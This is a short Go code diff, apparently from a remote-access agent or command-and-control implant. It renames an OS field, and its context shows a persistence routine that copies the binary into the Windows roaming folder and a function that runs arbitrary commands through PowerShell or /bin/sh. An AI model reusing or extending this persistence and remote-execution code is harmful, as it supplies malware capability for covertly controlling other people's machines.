@@ -132,7 +132,7 @@ func shell(slicedCommand []string) string {
 
 func persistAgent(agent models.NewAgent) (resp string) {
 	resp = ""
-	if agent.SO == "windows" {
+	if agent.OS == "windows" {
 		fileName := filepath.Base(os.Args[0])
 		roaming, err := os.UserConfigDir()
 		if err != nil {
@@ -252,10 +252,10 @@ func getFile(agent models.NewAgent) (resp string) {
 func shellCommand(command string, agent models.NewAgent) string {
 	var resp string
 
-	if agent.SO == "windows" {
+	if agent.OS == "windows" {
 		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
 		resp = string(output)
-	} else if agent.SO == "linux" {
+	} else if agent.OS == "linux" {
 		output, _ := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		resp = string(output)
 	} else {
